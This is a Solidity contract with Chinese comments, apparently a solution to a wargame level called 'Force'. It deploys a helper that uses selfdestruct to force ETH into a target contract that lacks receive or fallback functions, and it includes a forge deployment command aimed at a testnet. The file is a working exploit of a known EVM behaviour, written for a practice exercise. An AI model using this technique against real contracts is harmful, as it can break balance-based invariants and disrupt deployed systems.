// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AttackForce
 * @notice 通过 selfdestruct 强制向 Force 合约发送 ETH
 *
 * 原理：
 * selfdestruct 会在 EVM 层面直接转移余额，不触发目标合约的任何代码
 * 因此即使目标合约没有 receive/fallback，也能强制接收 ETH
 forge create src/08-Force/AttackForce.sol:AttackForce \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $Force_ADDRESS
 */
contract AttackForce {
    address public owner;
    address payable public target;

    constructor(address payable _target) {
        owner = msg.sender;
        target = _target;
    }

    /**
     * @notice 接收 ETH
     */
    receive() external payable {}

    /**
     * @notice 自毁并将所有 ETH 发送到目标地址
     *
     * EVM 执行流程：
     * 1. SELFDESTRUCT 操作码直接修改目标地址的 balance
     * 2. 不调用目标的 receive/fallback，无法被拒绝
     * 3. 标记当前合约为待删除，在交易结束时删除合约代码
     */
    function attack() external {
        require(msg.sender == owner, "Only owner");
        require(address(this).balance > 0, "No ETH to send");

        // selfdestruct 会强制将 ETH 发送到 target
        // 即使 target 没有 receive/fallback 也无法拒绝
        selfdestruct(target);
    }

    /**
     * @notice 查看合约余额
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
